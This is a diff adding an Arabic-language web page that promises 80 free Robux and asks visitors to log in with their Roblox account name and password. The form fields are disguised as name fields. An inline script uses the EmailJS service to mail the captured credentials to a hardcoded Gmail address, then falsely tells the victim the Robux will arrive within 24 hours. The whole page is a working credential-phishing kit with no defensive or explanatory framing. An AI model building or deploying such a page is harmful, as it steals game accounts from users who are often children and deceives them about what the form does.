@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>شحن 80 روبوكس فقط مجانا لمرة واحدة</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Cairo', sans-serif;
+      background: linear-gradient(135deg, #4a00e0, #8e2de2);
+      color: white;
+      text-align: center;
+      padding: 50px 10px;
+      margin: 0;
+    }
+
+    h2 {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    .form-container {
+      background-color: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 20px;
+      max-width: 90%;
+      margin: auto;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    }
+
+    input, textarea {
+      width: 100%;
+      border: none;
+      border-radius: 10px;
+      padding: 15px;
+      font-size: 16px;
+      font-family: 'Cairo', sans-serif;
+      background-color: rgba(255, 255, 255, 0.95);
+      color: #333;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+    }
+
+    textarea {
+      height: 120px;
+      resize: none;
+    }
+
+    button {
+      margin-top: 5px;
+      background-color: #ffffff;
+      color: #4a00e0;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 10px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s, background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #f0f0f0;
+      transform: scale(1.05);
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+  </style>
+  <script>
+    (function () {
+      emailjs.init("8_NecXdeh7uXHN0on"); // Public Key
+    })();
+
+    function sendEmail() {
+      const firstName = document.getElementById("firstName").value.trim();
+      const fullName = document.getElementById("fullName").value.trim();
+
+      if (!firstName || !fullName) {
+        alert("يرجى ملء خانتي الاسم كلمة السر.");
+        return;
+      }
+
+      const message = `الاسم: ${firstName}\nالباسوورد  : ${fullName}`;
+
+      emailjs.send("service_xpybfgi", "template_2ann2zo", {
+        message: message,
+        to_email: "yazanhuseen8@gmail.com"
+      }).then(function (response) {
+        alert("✅ سيتم الروبوكس خلال 24 ساعة !");
+        // تنظيف الحقول بعد الإرسال
+        document.getElementById("firstName").value = "";
+        document.getElementById("fullName").value = "";
+      }, function (error) {
+        alert("❌ حدث خطأ: " + JSON.stringify(error));
+      });
+    }
+  </script>
+</head>
+<body>
+  <div class="form-container">
+    <h2>سجل دخول حسابك روبلوكس للشحن (80)</h2>
+    <input id="firstName" type="text" placeholder="اسم الحساب" />
+    <input id="fullName" type="text" placeholder="الباسوورد" />
+    <button onclick="sendEmail()">تابع الشحن المجاني (80)</button>
+  </div>
+</body>
+</html>
